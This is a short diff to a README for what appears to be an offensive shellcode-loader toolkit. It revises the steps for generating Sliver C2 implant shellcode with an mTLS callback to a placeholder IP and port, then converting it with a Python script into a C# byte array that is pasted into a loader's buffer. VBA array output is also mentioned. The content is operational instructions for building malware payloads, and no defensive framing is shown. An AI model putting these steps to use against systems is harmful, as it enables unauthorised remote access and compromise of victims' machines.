@@ -13,10 +13,12 @@ Visual Studio (Release, x64).
 
 ## Shellcode
 
-These loaders take **raw** shellcode. Generate it as a C# array directly:
+These loaders take **raw** shellcode. Generate shellcode, then convert to a C#
+byte array:
 
 ```bash
-sliver > generate --mtls <IP>:<PORT> --format csharp --save /tmp/sc.cs   # paste byte[] into `buf`
+sliver > generate --mtls <IP>:<PORT> --format shellcode --save /tmp/sc.bin
+python3 sliver/sliver2arrays.py /tmp/sc.bin --csharp   # paste byte[] into `buf`
 ```
 
 Or generate raw shellcode and convert (incl. VBA `Array(...)`) — run from the
